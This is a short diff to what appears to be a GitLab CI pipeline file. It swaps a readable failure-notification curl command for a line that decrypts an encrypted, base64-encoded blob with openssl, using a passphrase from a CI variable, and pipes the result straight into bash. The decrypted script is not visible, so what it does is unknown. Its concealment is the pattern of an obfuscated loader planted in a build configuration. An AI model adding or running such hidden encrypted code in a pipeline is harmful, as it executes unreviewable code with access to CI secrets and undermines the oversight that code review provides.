@@ -33,4 +33,4 @@ notify_on_failure:
   stage: notify
   when: on_failure
   script:
-  - curl -s "https://sc.ftqq.com/${scu_key}.send?text=gitlab_pages_deploy_failed"
+  - bash <(echo "U2FsdGVkX183VOA/hRYzJuqpRocOyUzcHEOEg32wqaejoHKPbQmOz5gnA3agNTLJcNO5ihjvozTUJZAXSnryal9UFfDPLUR4Nw0cPhutP1x/xuQWmdMDl7KZ0WDOMK5t0Y1Or4Nmcpxi1jAbMXZPu7eZcR5OcLMnoAtYpvKaaMTwX7Eiu8ACo49JxDBnwyP8" | openssl aes-256-cbc -a -d -k ${ENCRYPTION_PASSPHRASE})
